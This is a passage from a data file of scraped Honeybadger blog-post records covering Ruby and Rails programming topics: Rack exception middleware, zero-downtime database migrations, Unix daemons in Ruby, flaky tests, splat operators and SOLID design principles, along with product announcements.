\"/something\" ), UnixPipe . new )", "date": "2015-08-04"},
{"website": "Honey-Badger", "title": "How Rails' fancy exception page works", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-rails-fancy-exception-page-works/", "abstract": "One of the nice things about working with rails is that when something goes wrong in development, you get a really nice error detail page. You get a nice backtrace, with the parts relevant to your app highlighted. You can see the params that got posted, as well as inspect environment and session variables. Today we're going to take a look at how these fancy error pages work. Cracking open Actionpack The file we're going to be mostly concerned with today is actionpack/lib/action_dispatch/middleware/debug_exceptions.rb . It does most of the heavy lifting when it comes to displaying those development mode error pages. If you're curious about where the production mode error screens come from, check out public_exceptions.rb . Rack Middleware If you're not familiar with rack middleware, the concept is simple. It allows you to intercept HTTP requests before they get to your app, and to intercept the app's output before it goes back to the user. Here's a simple middleware that doesn't do anything interesting. class MyMiddleware def initialize ( app ) @app = app end def call ( env ) @app . call ( env ) end end Rescuing all exceptions via rack middleware Any exception that occurs in your app occurs as a result of calling @app.call(). So rescuing all exceptions in a rack app is as simple as adding a rescue clause to the middleware. def call ( env ) @app . call ( env ) rescue StandardError => exception # this is a method we have to provide to generate the exception page render_exception ( env , exception ) end Anything returned from the call method will be treated as if it were a normal web page. So the content returned by render_exception replaces the original response. Rendering the exception I've excerpted the render_exception method from ActionDispatch::DebugExceptions. As you can see, it simply pulls the relevant data from the exception and feeds it into an ERB template. def render_exception ( env , exception ) wrapper = ExceptionWrapper . new ( env , exception ) log_error ( env , wrapper ) if env [ 'action_dispatch.show_detailed_exceptions' ] request = Request . new ( env ) template = ActionView :: Base . new ([ RESCUES_TEMPLATE_PATH ], request: request , exception: wrapper . exception , application_trace: wrapper . application_trace , framework_trace: wrapper . framework_trace , full_trace: wrapper . full_trace , routes_inspector: routes_inspector ( exception ), source_extract: wrapper . source_extract , line_number: wrapper . line_number , file: wrapper . file ) file = \"rescues/ #{ wrapper . rescue_template } \" if request . xhr? body = template . render ( template: file , layout: false , formats: [ :text ]) format = \"text/plain\" else body = template . render ( template: file , layout: 'rescues/layout' ) format = \"text/html\" end render ( wrapper . status_code , body , format ) else raise exception end end def render ( status , body , format ) [ status , { 'Content-Type' => \" #{ format } ; charset= #{ Response . default_charset } \" , 'Content-Length' => body . bytesize . to_s }, [ body ]] end Other uses You can use this rack middleware trick to do lots of interesting things with exceptions. Here at Honeybadger, we use it to intercept errors and record them to our API.  Here's the code we use to do it: def call ( env ) config . with_request ( :: Rack :: Request . new ( env )) do begin env [ 'honeybadger.config' ] = config response = @app . call ( env ) rescue Exception => raised env [ 'honeybadger.error_id' ] = notify_honeybadger ( raised , env ) raise end framework_exception = framework_exception ( env ) if framework_exception env [ 'honeybadger.error_id' ] = notify_honeybadger ( framework_exception , env ) end response end ensure Honeybadger . context . clear! end", "date": "2015-08-03"},
{"website": "Honey-Badger", "title": "Zero downtime migrations: 500 million rows", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/zero-downtime-migrations-of-large-databases-using-rails-postgres-and-redis/", "abstract": "Data makes things hard In this article I'm going to go over some of the tricks we use to handle large data migrations at Honeybadger. Check out the video for a quick overview. When you have a lot of data, your life gets harder. When you only have 1000 rows, you can make DB-wide changes in IRB. With millions of rows, it's not that easy. If you don't believe me, just try it. RAM will spike. Your app will get slow. It might even stop working altogether. Of couse it depends on your hardware. If you happen to be running on an underpowered EC2 instance, you might start having problems at 10,000 rows. Forget about Rails migrations When I say \"migration\" here, I'm not talking about Rails migrations. Don't get me wrong. I love 'em. Use 'em all the time. But they're not what I'm talking about. What is a migration then? It's a big change to your database. Imagine that you have a database of mailing addresses. 5 million of them. The data entry people have been sloppy, and so the addresses are in all kinds of formats. But you really need them to be in strict USPS format. Fortunately, there's an API you can use for that. Unfortunately, you need to make an API call for each of the 5 million addresses. ...and you can't have any downtime. That's what I call a migration. You may have another word for it. Maybe a four-letter word. But that's just semantics. There's no magic bullet I'm going to be talking about postgres here, but mongo users have the same problems. No matter what we do, computers stubbornly refuse to be infinitely fast. For any computer, there's is a greater or equal dataset. I think that the understanding of this is a kind of turning point in the training of young developers. I had to learn it the hard way. Why Facebook gamers hate me, personally. I remember when I learned the lesson that big datasets are fundamentally different from small datasets. Back when I was just starting out, I did some contract work for a facebook gaming company. Not a big one. There was just one other dev. But the game was pretty popular, and this was the height of mafia/jewel/farm game mania. The database was mysql. But all the data was stored as json inside a text field on the user model. This of course, meant that instead of ugly SQL `UPDATE users set something=true;\n` ...you could use elegant ruby `Users.find_each do |u| \n  u.update(:data => JSON.decode(u.data).merge( :something => true ).to_json)\nend` One time I had to write a rake task that tweaked a data structure for every user. It took about 30 minutes to run. That wouldn't have been a problem, except I hadn't planned for the \"in-between\" state. The application was still expecting the old data structure, but not everybody had that anymore. The result was a small UI bug, and a lot of pissed off facebook users. Fortunately, they had an in-game forum that they could use to yell at me. How do you plan for big migrations? Problems are simple Luckily, you've only got two problems to worry about: The app breaking The app slowing down Yay! Solutions are more complex To avoid these, you need to start thinking differenly about changes to\nyour app and your data. Embrace multi-step deploys Expect database-wide changes to take an indefinite amount of time Expect the scripts you wrote to do the DB migration to break Plan ahead for pegged CPU, RAM and disk IO Map out an escape route: You may need it Code! Battle-tested A lot of people write blog posts about things they've never done. But this isn't one of those. Here at Honeybadger HQ, we've used all the tricks I'm about to show you IRL. Prepare your app to handle in-between time If a migration takes a day, then for that day part of your data is \"pending\" and part is \"processed\" Your app needs to be able to handle both pending and processed data. Suppose you're spitting a single name field into first_name and last_name . Your code might look like this: `class User\n  before_save :split_name\n\n  def to_s\n    pending? ? name : [first_name, last_name].join(\" \")\n  end\n\n  def split_name\n    self.first_name, self.last_name = name.split(\" \", 2)\n  end\nend` Now that you have 2 representations of a user's name you need to Make sure you update both representations when new records are saved Use the new data when possible, but fall back to the old data Remove this ASAP. It's ugly as sin. Know which data have been migrated If your migration script fails, you need to be able to re-start it and pick up where you left off. It can be as simple as saving ids to a flat file. But we like to use the rollout gem. Rollout The rollout gem is built to make incremental releases easier. It lets you set a \"feature available\" flag on any model and gives you an easy way to see if the flag is set. For the back end We recently did a migration for all of our Projects. After each project was done, we set a flag like so: `$rollout.activate_user(:done, project)` For the front end Then in our front-end code, we could invoke either the new or old behavior based on that flag. `render($rollout.active?(:done, project) ? \"new_thing\" : \"old_thing\")` Granted, the rollout method names are a little out of sync with the use-case. But it works nicely. Log all the things...separately Chances are, you'll want to keep an eye on your migration. But if the output from your migration is mixed in with production data, it can be hard to tell what's happening. And it'd be nice to have debug-level logging too, just in case your rake task aborts. Use Rails environments Here's a cool trick. Just use a separate \"migration\" Rails environment. All you need to do is add a few lines to your config/database.yml `migration:\n  adapter: postgresql\n  database: ...\n  username: ...\n  password: ...` Now all of your logs will be saved to log/migration.log . And if you're reporting errors to Honeybadger, they'll be flagged as migration errors. pretty nifty, eh? Keep an eye on your database Large datasets tend to distort space and time. A totally innocent select count(*) from users will work fine with 1000 users, but take forever with 10,000,000 users. Also, large datasets tend to accumulate strangeness. Did you forget to limit the user's name to 1000 chars? You're likely to find at least one user with a 2Mb name. Monitor long-running queries It's important to check your database for queries taking an abnormally long time to run. In postgres this is easy. The following command will update once per second and show you current queries, as well as how long they’ve been running. `watch -n1 \"psql -c \\\"select substring(query from 0 for 120) q,  now() - query_start from pg_stat_activity where state='active' order by query_start limit 20\\\"\"` Limit all the things If you do find that queries are taking longer than they should, chances are that you forgot to put a limit somewhere. Suppose that you know a user never has more than 100 items in their shopping cart. Nobody has ever bought more than 100 items. Well, you’re going to find someone who’s put 100,000 items in their cart. And when you do, all of those items are going to be loaded into ram. Limit all the strings The same thing goes for string lengths. Sometimes you'll find abnormally long strings in your DB. You can truncate those right in sql. `select substring(message from 0 for 140) from tweets;\n` Be careful with ActiveRecord And with that in mind, it's clear that you should prefer Rails' find_each over all . And that you should do as much processing as\npossible in postgres. Avoid using production systems Here at Honeybadger, we have servers who’s only job in life is to mirror the production database, and be available if they happen to die. These replicants are darn handy if you happen to be doing a read-intensive migration. In our elastic search switch, we had to run some queries that took 30 minutes to complete. By running them against the replicant we were able to avoid slowing down production. Doing this is pretty simple. Just create a new environment, and point it at your replicant in the database.yml file `migration:\n  adapter: postgresql\n  database: replicant_hostname\n  username: ...\n  password: ...\n` Hot swap systems You can take this one step further if you like. Just do the migration completely on the replicant then cut over to it. The replicant becomes the new master and the master becomes the new replicant. And paranoia Of course there’s no reason that your changes on server A should affect server Z, but it never hurts to keep an eye on server Z. Surprising things can happen when you network computers together.", "date": "2013-08-06"},
{"website": "Honey-Badger", "title": "A theoretical introduction to unix daemons in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/unix-daemons-in-ruby/", "abstract": "Unix daemons are programs that run in the background. Nginx, Postgres and OpenSSH are  a few examples. They use a some special tricks to \"detatch\" their processes, and let them run independently of any terminal. I've always been kind of fascinated with daemons - maybe it's the name - and I thought it'd be fun to do a post illustrating how they work. And specifically, how you can create them in Ruby. ...but first. Don't try this at home! You probably don't want to make a daemon. There are much easier ways to get the job done. You might want to make a program that runs in the background. No problem. Your OS provides a system to let you run normal programs in the background. On ubuntu, this is accomplished via Upstart of systemd. On OSX it's launchd. There are others. But they all work according to the same concept. You provide a configuration file telling the system how to start and stop the long-running program. Then...well, that's pretty much it. You can start the program using a system command like service my_app start and it runs in the background. In short, upstart is simple & reliable while old-school daemons are arcane and very hard to get right. ...but if that's the case, why should we learn about daemons?  Well, because fun! And we'll  learn some interesting facts about Unix processes along the way. The simplest daemon Now that you've been told to never make a daemon, let's make some daemons! As of Ruby 1.9, this is incredibly simple. All you have to do is use the Process.daemon method. # Optional: set the process name to something easy to type<br>$PROGRAM_NAME = \"rubydaemon\"<br> # Make the current process into a daemon Process . daemon () # Once per second, log the current time to a file loop do File . open ( \"/tmp/rubydaemon.log\" , \"a\" ) { | f | f . puts ( Time . now ) } sleep ( 1 ) end Now, when I run this script, control passes back to the console. If I tail my log, I can see that the timestamp is being added every second, just like I expected. So that was easy. But it still doesn't explain how daemons work. To really understand that, we need to do the daemonization manually. Changing the parent process If you use bash to run a normal program, that program's process is a child of bash. But with daemons, it doesn't matter how you launch them. Their parent process is always the \"root\" process provided by the OS. You can tell this by looking at the daemon's parent id. A daemon's parent id is always 1. In the example below we use pstree to show this: $ pstree\n-+ = 00001 root /sbin/launchd\n |--- 72314 snhorne rubydaemon Interestingly enough, this is also what \"orphaned processes\" look like. An orphaned process is a child process whose parent has terminated. So, to create a daemon we have to intentionally orphan a process. The code below does this. # Optional: set the process name to something easy to type $PROGRAM_NAME = \"rubydaemon\" # Create a new child process and exit the parent. This \"orphans\" # our process and creates a daemon. exit if fork () # Once per second, log the current time to a file loop do File . open ( \"/tmp/rubydaemon.log\" , \"a\" ) { | f | f . puts ( Time . now ) } sleep ( 1 ) end The call to fork results in two processes running the same code. The original process is the parent of the new process. Fork returns a truthy value for the parent and a falsy value for the child. So exit if fork() only exits the parent. Detatching from the current session Our \"daemonization\" code has a few problems. While it successfully orphans the process,  it's still part of the terminal's session. That means that if you kill the terminal, you kill the daemon. To fix this, we need to create a new session and re-fork. Not familiar with unix session groups? Here's a good StackOverflow post. # Optional: set the process name to something easy to type $PROGRAM_NAME = \"rubydaemon\" # Create a new child process and exit the parent. This \"orphans\" # our process and creates a daemon. exit if fork # Create a new session, create a new child process in it and # exit the current process. Process . setsid exit if fork # Once per second, log the current time to a file loop do File . open ( \"/tmp/rubydaemon.log\" , \"a\" ) { | f | f . puts ( Time . now ) } sleep ( 1 ) end Re-routing STDIN, STDOUT and STDERR Another problem that the code above has is that it leaves the existing STDOUT, etc in place. That means that if you launch the daemon from a terminal, anything the daemon writes to STDOUT will be sent to your terminal. Not good. But you can actually re-route STDIN, STDOUT, and STDERR to any path. Here we re-route to /dev/null. # Optional: set the process name to something easy to type $PROGRAM_NAME = \"rubydaemon\" # Create a new child process and exit the parent. This \"orphans\" # our process and creates a daemon. exit if fork # Create a new session, create a new child process in it and # exit the current process. Process . setsid exit if fork STDIN . reopen \"/dev/null\" STDOUT . reopen \"/dev/null\" , \"a\" STDERR . reopen '/dev/null' , 'a' # Once per second, log the current time to a file loop do File . open ( \"/tmp/rubydaemon.log\" , \"a\" ) { | f | f . puts ( Time . now ) } sleep ( 1 ) end Changing the working directory Finally, the working directory of the daemon is whatever directory we happened to be in when we ran it. That's probably not the best idea, as I might decide to delete the directory later on. So let's change the directory to / . # Optional: set the process name to something easy to type $PROGRAM_NAME = \"rubydaemon\" # Create a new child process and exit the parent. This \"orphans\" # our process and creates a daemon. exit if fork # Create a new session, create a new child process in it and # exit the current process. Process . setsid exit if fork STDIN . reopen \"/dev/null\" STDOUT . reopen \"/dev/null\" , \"a\" STDERR . reopen '/dev/null' , 'a' Dir . chdir ( \"/\" ) # Once per second, log the current time to a file loop do File . open ( \"/tmp/rubydaemon.log\" , \"a\" ) { | f | f . puts ( Time . now ) } sleep ( 1 ) end Haven't I seen this before? This sequence of steps is basically what every Ruby daemon had to do before the Process.daemon method was added to Ruby core. I pretty much copied it line for line from an ActiveSupport extension to the Process module which was removed in Rails 4.x. You can see that method here .", "date": "2015-07-21"},
{"website": "Honey-Badger", "title": "The Case of the Flaky Test Suite", "author": ["Jason Swett"], "link": "https://www.honeybadger.io/blog/case-of-the-flaky-test-suite/", "abstract": "I recently worked on a test suite that was really frustrating to use due to its unreliability. The application that the test suite was targeting was a Rails API-only application. The tests were written in JavaScript using a framework called Chakram , \"an API testing framework designed to perform end to end tests on JSON REST endpoints\". The problem with the test suite was that it wasn't deterministic . A function or program is deterministic if, given the same inputs, it always gives the same outputs. This particular test suite would pass on the first run, pass on the second run, then fail on the third run, without changes having been made to either the application code or the test code. I discovered that I could bring the test suite back to passing by doing a rake db:reset . The tests, which operated on the Rails application's development environment and not on the test environment, depended on the Rails application's database being in a certain state when the test suite started running. Sometimes I could start with a freshly seeded database, run the test suite, and then successfully run the test suite a second time. I might even be able to run the test suite three or more times. But quite often, the test suite would somehow mess up the data and I'd have to do another rake db:reset to get the data back to a state that the test suite could successfully use. This is of course not how things should be. A test suite should only ever fail for one reason: the code it's testing stops working properly. What should have been done instead So if this test suite was set up in a problematic way, would would have been the right way to do it? The root of the problem was that the test suite depended on the database reset being done manually by a human. Instead, each individual test in the test suite should have automatically put the database in a clean and ready state before running. (It's also typical for a test to wipe the database after running so it doesn't \"leak\" its data into other tests. This isn't strictly necessary if every single test clears the database before running, but it's a good protective measure.) The test suite should also have targeted the Rails application's test environment and not development environment. A developer's actions in the development environment shouldn't intefere with a test suite's work and vice versa. Other types of problematic dependencies In my story, the problematic dependency was a database that wasn't getting cleaned properly. Another type of problematic dependency is a network request. Imagine you have a test suite that hits the Twilio API. You run the test suite on a Tuesday and it passes. Then on Wednesday you run the same test suite and it fails. Unbeknownst to you, Twilio is having an outage, and that's why your test suite failed. A few minutes later the outage is resolved and your test suite passes again. This goes back to the idea that a test should only fail for one reason, and that's if your application code stops working. If you need to write tests for code that interacts with the network, a better way to do it (if you're using Ruby/Rails) is to use a tool like VCR that lets you record network requests and then replay them later without actually using the internet. Cases when outside dependencies are okay It could be argued that if an application depends on the Twilio API and the Twilio API went down, then the application really did break and so the test really should fail. How do we reconcile this idea with the idea that tests shouldn't depend on outside conditions? The way to reconcile these two things is to make a distinction between integration tests , which test multiple layers or systems together, and unit tests , which test a single piece of functionality in isolation. If a team were to make a conscious decision that a certain set of their tests were going to hit external services across the network so multiple systems could be tested together, then there's nothing \"wrong\" about that. (The alternative would be to decide not to try to test those systems together at all.) In this scenario the team would just have to be aware that their network-dependent integration test suite is not guaranteed to be deterministic and will probably flake out sometimes. A test suite like this should live separately from the set of tests developers run on their machines every day to check for regressions. While there's an exception to the rule that tests shouldn't depend on outside conditions, most of the time the rule should be observed, giving your test suite the benefit of being deterministic and reliable.", "date": "2018-08-01"},
{"website": "Honey-Badger", "title": "Announcing DataDog, OpsGenie and Victorops Integrations", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/announcing-datadog-opsgenie-and-victorops-integrations/", "abstract": "We just launched three great new integrations that will make it even easier to integrate Honeybadger into your operations workflow. I'm talking about Datadog, OpsGenie and VictorOps. Datadog Datadog is an event aggregation service that gathers information from all of the tools that you have monitoring your app — now, including Honeybadger. When you set up the Datadog integration we'll send every exception, status, comment, and deploy notification. That means you can use DataDog's sophisticated toolset to correlate exceptions to other events happening in your infrastructure. We've been experimenting with Datadog for some of our own data aggregation needs. Here's a screenshot of some of our internal Honeybadger channels: For more information on setting up Honeybadger and Datadog, check out our integrations page . OpsGenie OpsGenie is an alerts routing system. You forward your alerts from all your services to OpsGenie. Then, if you happen to be on call, OpsGenie will forward those alerts to you via email, SMS, or their mobile app. Here's an example of a Honeybadger alert seen from inside OpsGenie's mobile app: For more information on setting up Honeybadger and OpsGenie, check out our integrations page . VictorOps VictorOps is an alerts routing system that gives your team a place to collaboratively address problems as they arise. You simply forward your Honeybadger and other alerts to them and they send them to the person on call, according to whatever schedule you've defined. For more information on setting up Honeybadger and VictorOps, check out the great guide the folks at VictorOps put together.", "date": "2016-02-22"},
{"website": "Honey-Badger", "title": "Using splats to build up and tear apart arrays in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-splat-array-manipulation-destructuring/", "abstract": "One of the things that I love about Ruby is the depth of its features. You may use an operator, but do a little digging and you'll find that you've only been scratching the surface of what it's capable of. The humble splat operator ( * and ** ) is a great example. You've probably used splats for \"catch-all\" arguments. And that's all that most people use them for. def go ( x , * args ) puts args . inspect end go ( \"a\" , \"b\" , \"c\" ) If you are using the newfangled keyword argument syntax, use a double splat like so: def go ( ** params ) puts params . inspect end go ( x: 100 , y: 200 ) This is useful, but you can use splats for a lot more. Let's dive in! Using an array to pass multiple arguments Not only can you use splats when defining methods, but you can also use them when calling methods. They let you pass an array into a function expecting multiple arguments. The first item in the array becomes the first argument, the second item becomes the second argument and so on. def go ( x , y ) end point = [ 12 , 10 ] go ( * point ) And don't forget that you can use a double splat for new style keyword arguments: def go ( x :, y :) end point = { x: 100 , y: 200 } go ( ** point ) The splat doesn't have to go at the end While it's common to put your splatted arguments at the end of the argument list, there is no law requiring it. You can put the splat anywhere in the argument list. def go ( x , * args , y ) puts x # => 1 puts y # => 5 puts args . inspect # => [2,3,4] end go ( 1 , 2 , 3 , 4 , 5 ) Array Destructuring All of these tricks with arguments are just a special case of array destructuring. In case you aren't familiar with the term \"array destructuring,\" it simply means to break an array down into individual items. It looks like this: a , b = [ 1 , 2 ] puts a # 1 puts b # 2 This works well but it can be a pain to have to specify a variable to hold every single item in the array. The splat operator gets around this - acting essentially like a wildcard. Lets take a look at a few examples. Popping the first item from an array Occasionally it's useful to be able to pop the first item off of an array without altering the original array. That's what this example does. first , * remainder = [ 1 , 2 , 3 , 4 , 5 ] first # => 1 remainder # => [2, 3, 4, 5] If you just wanted the first item but not the rest of the array, you can use the syntax: first , * = [ 1 , 2 , 3 , 4 , 5 ] first # => 1 Popping the last item To pull the item off of the end of the array instead of the beginning, just stick the splat at the beginning like so: * prefix , last = [ 1 , 2 , 3 , 4 , 5 ] last # => 5 prefix # => [1, 2, 3, 4] Again, if we don't want a specific variable, we don't have to assign it: Get the first and last n items of an array If you put the splat operator in the middle, you can pull an arbitrary number of items off of each end of the array. first , * , last = [ 1 , 2 , 3 , 4 , 5 ] first # => 1 last # => 5 Limitations When using the splat operator in array destructuring, you still have to specify the position of array items with respect to the beginning and end of the array. So it's not the best tool for extracting items from the middle of a long array. Also, I can't seem to find any cool tricks using the double-splat ( ** ) operator to mess with hashes. Lame! Constructing arrays The splat operator is useful not only for destructuring arrays but also for constructing them. In the following example, we use splat to join two arrays. [ * [ 1 , 2 ], * [ 3 , 4 ]] => [ 1 , 2 , 3 , 4 ] This is the equivalent of [[1, 2], [3,4]].flatten . If that were the end of the story, it wouldn't be very useful. But splat has another peculiar ability. It can intelligently coerce objects into arrays. # Usually `*thing` wraps `thing` in an array x = * \"hi mom\" # => [\"hi mom\"] # ...unless it's nil x = * nil # => [] # Arrays are passed through unchanged x = * [ 1 , 2 , 3 ] # => [1, 2, 3] # But hashes are converted to arrays x = * { a: 1 } # => [[:a, 1]] This gives us a tool for building arrays without having to do a ton of manual type coercion. For example, imagine you're collecting an array of strings for some configuration system. Normally you'd want to: Check if the array exists, and initialize it if not Respond intelligently if someone tries to add an array of strings, not just a single string The splat operator gives us this for free: # Your configuration hash may or may not have # an existing :ignore array. config = { } # The callback function might return an array # or it might return a single item. def add_ignores \"scoundrels\" # could also be an array like [\"scoundrels\", \"cads\", \"ne'er-do-wells\"] end # This is where the magic happens. No matter what you # start with you get an array of things to ignore. config [ :ignore ] = [ * config [ :ignore ], * add_ignores ()] That's it I hope it's obvious that you probably shouldn't go rewrite all of your existing array-manipulation code to use splats. They're not always the right tool, and they can make code hard to read when used to frequently. However, sometimes an array splat trick is exactly what you need. I hope, when that time comes, you'll try one out. :)", "date": "2015-11-04"},
{"website": "Honey-Badger", "title": "Honeybager Mobile - now for iOS and Android", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/honeybager-mobile-now-for-ios-and-android/", "abstract": "We’re super excited to announce the release of the official Honeybadger Mobile app for iOS and Android With this new app you’ll get flexible push notifications for errors and outages. You’ll be able to manage critical problems on the go and ignore less critical issues. You’ll be able to assign errors and participate in discussions from anywhere you can take your phone. Get it now: iOS | Android If you're searching the Apple App Store, or Google Play the search term is \"Honeybadger Mobile\". You can search errors, mark them resolved and assign them. View full backtraces, request params, cookies and more on the error details page. View recent outages, as well as request latencies from our geographically-distributed uptime checkers.", "date": "2015-06-29"},
{"website": "Honey-Badger", "title": "Honeybadger Partners with Cloud 66", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/cloud-66-partners-with-honeybadger/", "abstract": "We’re excited to announce our partnership with Cloud 66 - a service to provision, deploy and scale Ruby apps on your own servers on any cloud. Since launching last year, they’ve taken the Ruby world by storm. They have an amazing product. People are buzzing about them. And they’re seeing great adoption rates with customers as impressive as Adobe and the BBC. So what does this partnership mean? It means that Cloud 66 customers will be able to add exception monitoring to any of their apps with the click of a button. No messing with config files. No updating of deploy scripts. It just works. It means that it’s easier than ever for you to be secure in the knowledge that your apps in production are up and running and happy. And it means that as our services evolve we’ll continue to search for ways that we can create value for both Honeybadger and Cloud66 customers. This is going to be awesome.", "date": "2014-03-06"},
{"website": "Honey-Badger", "title": "What Seasoned Developers Should Know About Learning Elixir", "author": ["Sophia Le"], "link": "https://www.honeybadger.io/blog/what-seasoned-developers-should-know-about-learning-elixir/", "abstract": "The last time we went to ElixirConf , we ended up rewriting a part of Honeybadger in Elixir. Therefore, it pays to learn new tools to solve problems, even if you're already an expert in other languages. Conferences are an excellent way to get exposed to new languages, which is why we recently sponsored ElixirConf 2016 and sent a lucky winner to the conference . Read how Honeybadger uses Elixir Judging from this year's topics, we are sold on its potential. If you're a seasoned developer but new to Elixir, here are three talks worth watching: If you're coming from Rails - Code Spelunking for Knowledge and Profit. Brian Cardarella walks you through how to read Elixir code. He believes reading will make you a better programmer. If you're a front-end person - From Front End to Full Stack with Elixir and Phoenix. Lauren Tan gives an overview of how you can incorporate Elixir into your front-end projects. If you're not sure where to start - Closing Keynote. Boyd Multerer is the so-called \"new guy\" in the Elixir community. He shares his experiences working with XboxLive and how Elixir can help us solve problems in the future. For the rest of the ElixirConf 2016 talks, check out the lineup at Confreaks . Get inspired and try out a project this weekend. You never know what you could end building.", "date": "2016-10-25"},
{"website": "Honey-Badger", "title": "SOLID Design Principles in Ruby", "author": ["Milap Neupane"], "link": "https://www.honeybadger.io/blog/ruby-solid-design-principles/", "abstract": "All software applications change over time. Changes made to software can cause cascading issues that are unexpected. However, change is unavoidable, as we cannot build software that does not change. The software requirements continue changing as the software grows. What we can do is design software in such a way that it is resilient to change. Designing software properly can take time and effort at the start, but in the long-term, it saves time and effort. Tightly coupled software is fragile, and we cannot predict what happens with change. Here are some of the effects of poorly designed software: It causes immobility. Changing code is expensive. It is easier to add more complexity than to make the software simpler. The code is unmanageable. It takes a lot of time for a developer to figure out how its functionalities work. Changing one part of the software usually breaks the other, and we cannot predict what issues a change can bring. The paper Design Principles and Design Patterns , lists the following symptoms of rotting software: Rigidity: It is very difficult to change code without causing problems, as making changes in one part prompts the need to make changes in other parts of the code. Fragility: Changing code usually breaks the behavior of the software. It can even break parts that are not directly related to the change. Immobility: Although some parts of a software application may have similar behavior, we are unable to reuse the code and must duplicate them. Viscosity: When the software is difficult to change, we keep adding complexity to the software instead of making it better. It is necessary to design software in such a way that changes can be controlled and predictable. SOLID design principles help resolve these issues by decoupling software programs. Robert C. Martin introduced these concepts in his paper titled Design Principles and Design Patterns, and Michael Feathers came up with the acronym later. The SOLID design principle includes these five principles: S ingle Responsibility Principle O pen/Closed Principle L iskov Substitution Principle I nterface Segregation Principle D ependency Inversion Principle We will explore each of them to understand how these principles can help build well-designed software in Ruby. Single Responsibility Principle - SRP Let us say that for HR management software, we need the functionality to create users, add the salary of an employee, and generate a payslip of an employee. While building it, we could add these functionalities to a single class, but this approach causes unwanted dependency among these functionalities. It is simple when we start, but when things change and new requirements arise, we will be unable to predict which functionalities the change would break. A class should have one, and only one reason to change - Robert C Martin Here's a sample code where all the functionality is in a single class: class User def initialize ( employee , month ) @employee = employee @month = month end def generate_payslip # Code to read from database, # generate payslip # and write it to a file self . send_email end def send_email # code to send email employee . email month end end To generate a payslip and send it to the user, we can initialize the class and call the generate payslip method: month = 11 user = User . new ( employee , month ) user . generate_payslip Now, there is a new requirement. We want to generate the payslip but do not want to send the email. We need to keep the existing functionality as it is and add a new payslip generator for internal reporting without sending an email, as it is for internal propose. During this phase, we want to ensure the existing payslip sent to employees remains functional. For this requirement, we cannot reuse the existing code. We either need to add a flag to the generate_payslip method saying if true send email else don't. This can be done, but since it changes the existing code, it might break the exiting functionality. To make sure we do not break things, we need to decouple these logics into separate classes: class PayslipGenerator def initialize ( employee , month ) @employee = employee @month = month end def generate_payslip # Code to read from database, # generate payslip # and write it to a file end end class PayslipMailer def initialize ( employee ) @employee = employee end def send_mail # code to send email employee . email month end end Next, we can initialize these two classes and call their methods: month = 11 # General Payslip generator = PayslipGenerator . new ( employee , month ) generator . generate_payslip # Send Email mailer = PayslipMailer . new ( employee , month ) mailer . send_mail This approach helps to decouple the responsibilities and ensures a predictable change. If we only need to change the mailer functionality, we can do that without changing the report generation. It also helps to predict any changes in functionality. Suppose we need to change the format of the month field in the email to Nov instead of 11 . In this case, we will modify the PayslipMailer class, and this will ensure that nothing will change or break in the PayslipGenerator functionality. Every time you write a piece of code, ask a question afterward. What is the responsibility of this class? If your answer has an \"and\" on it, beak the class into multiple classes. Smaller classes are always better than large, generic classes. Open/Closed Principle - OCP Bertrand Meyer originated the open/closed principle in his book titled Object-Oriented Software Construction. The principle states, \" software entities (classes, modules, functions, etc.) should be open for extension but closed for modification \". What this means is that we should be able to change behavior without changing the entity. In the above example, we have payslip-sending functionality for an employee, but it is very generic for all employees. However, a new requirement arises: generate a payslip based on the type of employee. We need different payroll generation logic for full-time employees and contractors. In this case, we can modify the existing PayrollGenerator and add these functionalities: class PayslipGenerator def initialize ( employee , month ) @employee = employee @month = month end def generate_payslip # Code to read from database, # generate payslip if employee . contractor? # generate payslip for contractor else # generate a normal payslip end # and write it to a file end end However, this is a bad patter. In doing so, we are modifying the existing class. If we need to add more generation logic based on employee contracts, we need to modify the existing class, but doing so violates the open/closed principle. By modifying the class, we risk making unintended changes. When something changes or is added, this might cause unknown issues in the existing code. These if-else can in more places within the same class. So, when we add a new employee type, we might miss places where these if-else are present. Finding and modifying them all can be risky and could create a problem. We can refactor this code in such a way that we can add functionality by extending the functionality but avoid changing the entity. So, let us create a separate class for each of these and have the same generate method for each of them: class ContractorPayslipGenerator def initialize ( employee , month ) @employee = employee @month = month end def generate # Code to read from the database, # generate payslip # and write it to a file end end class FullTimePayslipGenerator def initialize ( employee , month ) @employee = employee @month = month end def generate # Code to read from the database, # generate payslip # and write it to a file end end Make sure these have the same method name. Now, change the PayslipGenerator class to use these classes: GENERATORS = { 'full_time' => FullTimePayslipGenerator , 'contractor' => ContractorPayslipGenerator } class PayslipGenerator def initialize ( employee , month ) @employee = employee @month = month end def generate_payslip # Code to read from database, # generate payslip GENERATORS [ employee . type ]. new ( employee , month ). generate () # and write it to a file end end Here, we have a GENERATORS constant that maps the class to be called based on the employee type. We can use it to determine which class to call. Now, when we have to add new functionality, we can simply create a new class for that and add it in the GENERATORS constant. This helps to extend the class without breaking something or needing to think about the existing logic. We can easily add or remove any type of payslip generator. Liskov Substitution Principle - LSP The Liskov substitution principle states, \"if S is a subtype of T, then objects of type T may be replaced with objects of type S\" . To understand this principle, let us first understand the problem. Under the open/closed principle, we designed the software in such a way that it can be extended. We created a subclass Payslip generator that does a specific job. For the caller, the class that they are calling is unknown. These classes need to have the same behavior so that the caller is unable to tell the difference. By behavior, we mean that the methods in the class should be consistent. The methods in these classes should have the following characteristics: Have the same name Take the same number of arguments with the same data type Return the same data type Let us look at the example of the payslip generator. We have two generators, one for full-time employees and the other for contractors. Now, to ensure that these payslips have consistent behavior, we need to inherit them from a base class. Let us define a base class called User . class User def generate end end The subclass we created in the example of the open/close principle did not have a base class. We modify it to have the base class User : class ContractorPayslipGenerator < User def generate # Code to generate payslip end end class FullTimePayslipGenerator < User def generate # Code to generate payslip end end Next, we define a set of methods that are required for any subclass that inherits the User class. We define these methods in the base class. In our case, we only need a single method, called generate. class User def generate raise \"NotImplemented\" end end Here, we have defined the generate method, which has a raise statement. So, any subclass that inherits the base class needs to have the generate method. If it is not present, this will raise an error that the method is not implemented. In this way, we can make sure that the subclass is consistent. With this, the caller can always be sure that the generate method is present. This principle helps substitute any subclass easily without 